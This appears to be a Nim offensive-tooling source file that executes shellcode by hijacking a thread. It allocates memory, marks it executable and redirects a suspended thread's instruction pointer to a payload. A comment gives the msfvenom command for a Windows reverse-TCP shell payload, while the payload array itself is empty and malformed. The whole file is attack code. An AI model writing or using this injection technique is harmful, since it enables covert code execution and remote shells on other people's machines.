import winim/lean

proc classicHijack*(hThread: HANDLE, payload: openArray[byte]) =
    # Alloc
    var pBuffer = VirtualAlloc(NULL, payload.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if pBuffer == NULL:
        echo "[!] - Unable to alloc. Error: ", GetLastError()
        return

    pBuffer.copyMem(addr payload[0], payload.len)
    echo "[*] - Attempting to change permissions on: ", cast[int](pBuffer).toHex, " to PAGE_EXECUTE."
    # discard readLine(stdin)
    var oldPerms: DWORD
    if VirtualProtect(pBuffer, cast[SIZE_T](payload.len), PAGE_EXECUTE, addr oldPerms) != TRUE:
        echo "[!] - Unable to set permissions. Error: ", GetLastError()
        return

    var threadCtx: CONTEXT
    threadCtx.ContextFlags = CONTEXT_ALL
    if hThread.GetThreadContext(addr threadCtx) != TRUE:
        echo "[!] - Unable to get thread context. Error: ", GetLastError()
        return

    threadCtx.Rip = cast[DWORD64](pBuffer)
    if hThread.SetThreadContext(addr threadCtx) != TRUE:
        echo "[!] - Unable to set thread context. Error: ", GetLastError()
        return

    echo "[+] - Thread execution hijacked! Resume thread when ready."

proc dummy*() =
    echo "I am a dummy!"


if isMainModule:
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f nim
    let payload: array[460, byte] = [
        byte ] 
    var hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](dummy), NULL, CREATE_SUSPENDED, NULL)
    hThread.classicHijack(payload)
    hThread.ResumeThread()
    discard readLine(stdin)
